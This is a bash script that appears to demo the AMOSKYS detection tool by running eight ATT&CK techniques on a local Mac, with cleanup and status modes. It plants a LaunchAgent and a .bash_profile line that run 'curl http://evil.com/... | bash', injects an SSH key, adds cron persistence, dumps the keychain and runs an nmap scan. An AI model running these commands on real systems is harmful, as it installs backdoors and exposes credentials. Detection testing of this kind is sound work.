#!/bin/bash
# AMOSKYS Live Demo — Attack vs Detection split-terminal
#
# Usage:
#   bash scripts/live_demo.sh attack     # Run attacks (Terminal 2)
#   bash scripts/live_demo.sh cleanup    # Remove attack artifacts
#   bash scripts/live_demo.sh status     # Show what's on disk

set -euo pipefail
cd "$(dirname "$0")/.."

RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
CYAN='\033[96m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

banner() {
    echo ""
    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════${RESET}"
    echo -e "${BOLD}${CYAN}  AMOSKYS LIVE ATTACK DEMO${RESET}"
    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════${RESET}"
    echo ""
}

attack() {
    banner
    echo -e "${RED}${BOLD}  Running 8 attack techniques against this Mac${RESET}"
    echo -e "${DIM}  Each attack pauses 8s for AMOSKYS to detect${RESET}"
    echo ""

    # Attack 1: LaunchAgent Persistence (T1543.001)
    echo -e "${YELLOW}[ATTACK 1] T1543.001 — LaunchAgent Persistence${RESET}"
    echo -e "${DIM}  Dropping malicious plist to ~/Library/LaunchAgents/${RESET}"
    cat > ~/Library/LaunchAgents/com.amos.demo.plist << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.amos.demo</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://evil.com/steal.sh | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
PLIST
    echo -e "${RED}  PLANTED: com.amos.demo.plist${RESET}"
    sleep 8

    # Attack 2: Keychain Dump (T1555.001)
    echo ""
    echo -e "${YELLOW}[ATTACK 2] T1555.001 — Keychain Credential Theft${RESET}"
    echo -e "${DIM}  Running: security dump-keychain (read-only, no damage)${RESET}"
    security dump-keychain 2>/dev/null | head -5 || true
    echo -e "${RED}  EXECUTED: security dump-keychain${RESET}"
    sleep 8

    # Attack 3: Cron Persistence (T1053.003)
    echo ""
    echo -e "${YELLOW}[ATTACK 3] T1053.003 — Cron Persistence${RESET}"
    echo -e "${DIM}  Adding crontab entry: * * * * * /tmp/demo_evil.sh${RESET}"
    (crontab -l 2>/dev/null; echo "* * * * * /tmp/demo_evil.sh # AMOSKYS_DEMO") | crontab -
    echo -e "${RED}  PLANTED: crontab entry${RESET}"
    sleep 8

    # Attack 4: SSH Key Injection (T1098.004)
    echo ""
    echo -e "${YELLOW}[ATTACK 4] T1098.004 — SSH Authorized Keys Injection${RESET}"
    echo -e "${DIM}  Adding attacker's public key to authorized_keys${RESET}"
    echo "ssh-rsa AAAAB3NzaDEMO attacker@kali # AMOSKYS_DEMO" >> ~/.ssh/authorized_keys
    echo -e "${RED}  PLANTED: attacker SSH key${RESET}"
    sleep 8

    # Attack 5: Shell Profile Modification (T1546.004)
    echo ""
    echo -e "${YELLOW}[ATTACK 5] T1546.004 — Shell Profile Backdoor${RESET}"
    echo -e "${DIM}  Injecting curl|bash backdoor into .bash_profile${RESET}"
    echo '# AMOSKYS_DEMO' >> ~/.bash_profile
    echo 'curl -s http://evil.com/payload.sh | bash &>/dev/null & # AMOSKYS_DEMO' >> ~/.bash_profile
    echo -e "${RED}  PLANTED: .bash_profile backdoor${RESET}"
    sleep 8

    # Attack 6: System Discovery Burst (T1082)
    echo ""
    echo -e "${YELLOW}[ATTACK 6] T1082 — System Discovery Burst${RESET}"
    echo -e "${DIM}  Running: sw_vers + uname + sysctl + system_profiler${RESET}"
    sw_vers > /dev/null 2>&1
    uname -a > /dev/null 2>&1
    sysctl hw.model > /dev/null 2>&1
    system_profiler SPHardwareDataType > /dev/null 2>&1
    csrutil status > /dev/null 2>&1
    echo -e "${RED}  EXECUTED: 5 discovery commands${RESET}"
    sleep 8

    # Attack 7: Hidden File in /tmp (T1564.001)
    echo ""
    echo -e "${YELLOW}[ATTACK 7] T1564.001 — Hidden Executable${RESET}"
    echo -e "${DIM}  Creating hidden binary in /tmp${RESET}"
    echo '#!/bin/bash' > /tmp/.hidden_backdoor_demo
    echo 'echo "I am a backdoor"' >> /tmp/.hidden_backdoor_demo
    chmod +x /tmp/.hidden_backdoor_demo
    echo -e "${RED}  PLANTED: /tmp/.hidden_backdoor_demo${RESET}"
    sleep 8

    # Attack 8: Kali Port Scan (T1046) — if Kali is available
    echo ""
    echo -e "${YELLOW}[ATTACK 8] T1046 — Port Scan from Kali${RESET}"
    if ssh -i ~/.ssh/kali_lab -o BatchMode=yes -o ConnectTimeout=3 ghostops@192.168.237.132 "echo online" 2>/dev/null; then
        echo -e "${DIM}  Launching nmap scan from Kali VM${RESET}"
        ssh -i ~/.ssh/kali_lab ghostops@192.168.237.132 \
            "nmap -sS -p 1-100 192.168.237.1 --max-retries 1 -T4" 2>/dev/null &
        echo -e "${RED}  LAUNCHED: nmap scan from 192.168.237.132${RESET}"
    else
        echo -e "${DIM}  Kali VM not reachable, skipping${RESET}"
    fi
    sleep 8

    echo ""
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════${RESET}"
    echo -e "${BOLD}${GREEN}  ALL 8 ATTACKS COMPLETE${RESET}"
    echo -e "${BOLD}${GREEN}  Check Terminal 1 for AMOSKYS detections${RESET}"
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════${RESET}"
    echo ""
}

cleanup() {
    echo -e "${CYAN}Cleaning up demo artifacts...${RESET}"

    # LaunchAgent
    rm -f ~/Library/LaunchAgents/com.amos.demo.plist
    echo "  [-] Removed com.amos.demo.plist"

    # Crontab
    crontab -l 2>/dev/null | grep -v "AMOSKYS_DEMO" | crontab -
    echo "  [-] Cleaned crontab"

    # SSH key
    if [ -f ~/.ssh/authorized_keys ]; then
        grep -v "AMOSKYS_DEMO" ~/.ssh/authorized_keys > ~/.ssh/authorized_keys.tmp
        mv ~/.ssh/authorized_keys.tmp ~/.ssh/authorized_keys
        echo "  [-] Cleaned SSH authorized_keys"
    fi

    # Shell profile
    if [ -f ~/.bash_profile ]; then
        grep -v "AMOSKYS_DEMO" ~/.bash_profile > ~/.bash_profile.tmp
        mv ~/.bash_profile.tmp ~/.bash_profile
        echo "  [-] Cleaned .bash_profile"
    fi

    # Hidden file
    rm -f /tmp/.hidden_backdoor_demo
    echo "  [-] Removed /tmp/.hidden_backdoor_demo"

    echo -e "${GREEN}Cleanup complete.${RESET}"
}

status() {
    echo -e "${CYAN}Current attack artifacts on system:${RESET}"
    echo ""

    echo "LaunchAgents:"
    ls ~/Library/LaunchAgents/*.plist 2>/dev/null | grep -v "com.google\|homebrew\|com.apple" | while read f; do
        echo "  $(basename $f)"
    done

    echo ""
    echo "Crontab:"
    crontab -l 2>/dev/null | grep -v "^$" || echo "  (empty)"

    echo ""
    echo "SSH keys:"
    wc -l ~/.ssh/authorized_keys 2>/dev/null || echo "  (none)"

    echo ""
    echo "Hidden in /tmp:"
    ls -la /tmp/.hidden* 2>/dev/null || echo "  (none)"
}

case "${1:-help}" in
    attack)  attack ;;
    cleanup) cleanup ;;
    status)  status ;;
    *)
        echo "Usage: bash scripts/live_demo.sh {attack|cleanup|status}"
        echo ""
        echo "  attack  — Run 8 attacks (use in Terminal 2)"
        echo "  cleanup — Remove all demo artifacts"
        echo "  status  — Show current artifacts on disk"
        ;;
esac
